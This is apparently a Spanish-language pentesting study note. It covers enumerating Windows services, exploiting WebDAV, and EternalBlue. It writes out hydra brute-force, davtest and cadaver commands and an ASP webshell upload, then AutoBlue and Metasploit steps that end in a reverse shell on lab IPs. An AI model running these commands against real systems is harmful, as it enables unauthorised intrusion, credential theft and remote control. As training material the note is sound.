13-02-2025 19:22
Status: #idea
Tags: [[Assesment Methodologies]]

- [[#Windows|Windows]]
	- [[#Windows#Servicios comunes a exploits|Servicios comunes a exploits]]
	- [[#Windows#Exploiting WebDAV|Exploiting WebDAV]]
		- [[#Exploiting WebDAV#Herramientas|Herramientas]]
		- [[#Exploiting WebDAV#Demostración|Demostración]]
			- [[#Demostración#Enumeración|Enumeración]]
			- [[#Demostración#Bruteforcing|Bruteforcing]]
			- [[#Demostración#Exploiting|Exploiting]]


# Vulnerability Assessment

Esta sección nos mostrará el proceso de identificar, analizar y priorizar vulnerabilidades en sistemas, redes y aplicaciones. Su objetivo será detectar las posibles debilidades de seguridad antes de que un atacante pueda explotarlas.

En esta etapa, nos encargaremos de identificar las vulnerabilidades, pero no de explotarlas, por lo tanto, usaremos herramientas como Nessus, o MSF.


## Windows

En Windows podremos ver vulnerabilidades como:

- Information disclosure.
- Buffer Overflows.
- Remote Code Execution (RCE).
- Privilege Escalation.
- Denial of Service (DOS).

### Servicios comunes a exploits

Windows de por si tiene varios servicios nativos y diversos protocolos que se ejecutan por defecto.

Estos servicios proporcionan al atacante un vector de ataque que se podría usar para comprometer un equipo.

Aquí tenemos algunos servicios comunes a exploits:

- **Microsoft ISS** (Internet Information Services): 
	- Puerto 80/443. 
	- Es un servidor web que ha desarrollado Microsoft.

- **WebDAV** (Web Distributed Authoring & Versioning):
	- Puerto 80/443.
	- Es una extensión HTTP que permite a los clientes actualizar, borrar, mover o copiar ficheros en un servidor web.

- **SMB/CIFS** (Server Message Block Protocol): 
	- Puerto 445.
	- Es un protocolo para compartir ficheros a través de una red.

- **RDP** (Remote Desktop Protocol):
	- Puerto 3389.
	- Protocolo GUI propietario de Windows para acceder a equipos de manera remota.

- **WinRM** (Windows Remote Management Protocol):
	- Puerto 5986/443.
	- Es un protocolo que permite gestionar equipos de manera remota. Funciona a través de la red y permite ejecutar comandos, administrar servicios, y obtener información del sistema.


### Exploiting WebDAV

El primer paso para exploitear WebDAV será identificar si WebDAV está configurado en el servidor ISS.

Después, podremos hacer un ataque bruteforce para obtener credenciales válidas que nos permitan autenticarnos. Este último paso nos permitirá subir un fichero .asp maligno, que nos permitirá ejecutar comandos o iniciar una reverse shell en el objetivo.

#### Herramientas

- **davtest**: Se usa para escanear, autenticar y exploitear servidores WebDAV. Viene preinstalado en Kali y Parrot OS.

- **cadaver**: Cadaver nos permitirá subir, descargar, ver y editar ficheros, además de manipulación de propiedades, namespaces, colecciones, etc. Viene preinstalado en Kali y Parrot OS también.

#### Demostración

##### Enumeración

Para empezar, tendremos que enumerar si nuestro objetivo tiene WebDAV funcionando, para eso podremos usar nmap y escanear los puertos de este.

```bash
nmap -sV -sC 10.10.10.10
```

Con esto podremos confirmar si está WebDAV funcionando.

Para obtener más información, podremos usar el script de nmap **http-enum** de la siguiente manera:

```bash
nmap -sV -p 80 --script=http-enum
```

Este script nos dará normalmente la carpeta donde se encuentra la instalación de WebDAV.

##### Bruteforcing

Podremos usar hydra para esto, proporcionando una wordlist para los usuarios y otra para las contraseñas:

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.10.10.10 http-get /webdav/
```

##### Exploiting

Podremos usar **davtest**, y **cadaver** como hemos comentado anteriormente para subir ficheros y conseguir vulnerar el target.

```bash
davtest -auth bob:password_123321 -url http://10.10.10.10/webdav
```

Posteriormente, davtest nos dará una lista de ficheros que se pueden subir al servidor, y que se podrían ejecutar, mostrándonos así las extensiones que se pueden ejecutar.

Una vez que sepamos esto, podremos usar cadaver para vulnerar el objetivo:

```shell
cadaver http://10.10.10.10/webdav
```

Nos pedirá las credenciales, y posteriormente vemos como tenemos una shell que nos permitirá subir ficheros y hacer operaciones básicas.

Buscaremos shells que vengan en Kali por defecto en la ruta **/usr/share/webshells** adaptadas a la extensión que se pueda ejecutar en el servidor WebDAV.

Con este comando podremos subir el shell al servidor WebDAV:

```shell
put /usr/share/webshells/asp/webshell.asp
```

En el caso de que sea asp, si ejecutamos el shell en el servidor, veremos como nos da un input en el que podemos pasar los comandos que queramos, y nos mostrará su respuesta.

### EternalBlue (MS17-010 SMB)

EternalBlue es un exploit desarrollado por la NSA, y que fue filtrado por el grupo Shadow Brokers. 

Este exploit, a grandes rasgos, se encarga de enviar paquetes creados específicamente para que se facilite la ejecución de comandos arbitrarios. Además, nos proporcionará permisos de administrador.

Este exploit fue la base para WannaCry, que buscaba afectar con el ransomware al mayor número de equipos posibles. 

Este es el listado de versiones de Windows que se ven afectadas:

- Windows Vista
- Windows 7
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10
- Windows Server 2016

Microsoft lanzó un patch, pero aún hay muchos usuarios y compañías que no tienen este parche aplicado.

Existe un módulo auxiliar en metasploit que nos indicará si el sistema se verá afectado por este exploit.

#### Herramientas

[**AutoBlue-MS17-010**](https://github.com/3ndG4me/AutoBlue-MS17-010): Herramienta que nos permite exploitear esta vulnerabilidad sin necesidad de usar Metasploit.

**nmap**: Hay un script llamado **smb-vuln-ms17-010** que nos indicará si el target es vulnerable.

#### Pasos

##### AutoBlue

Necesitaremos instalar las dependencias con pip, y posteriormente ejecutar el **shell_prep.sh**.

```shell
chmod +x shell_prep.sh
./shell_prep.sh
```

Indicaremos el LHOST que necesitemos en el script (la IP de nuestra máquina), y el puerto (LPORT).

Nos preguntará si queremos un meterpreter o una shell cmd normal, seleccionaremos la opción que más nos convenga en el momento.

Veremos como ha generado ficheros, y entre ellos veremos el **sc_x64.bin** y el **sc_x86.bin**, que usaremos dependiendo de la arquitectura del objetivo.

Abriremos un netcat listener, y posteriormente solo tendremos que ejecutar el exploit:

```shell
chmod +x eternalblue_exploit7.py
python eternablue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin
```

Si todo ha ido bien, veremos que en nuestro netcat vemos la shell que ha spawneado.

##### Metasploit

Podremos usar el módulo **exploit/windows/smb/ms17_010_eternalblue**. Tendremos que hacer lo mismo que con AutoBlue, especificar RHOSTS, LHOST, y LPORT. 

Usaremos el comando **exploit**, y si todo ha ido bien, tendremos una nueva shell en meterpreter.

---
# Backlinks

```dataview
LIST
FROM [[]]
SORT file.name ASC
```
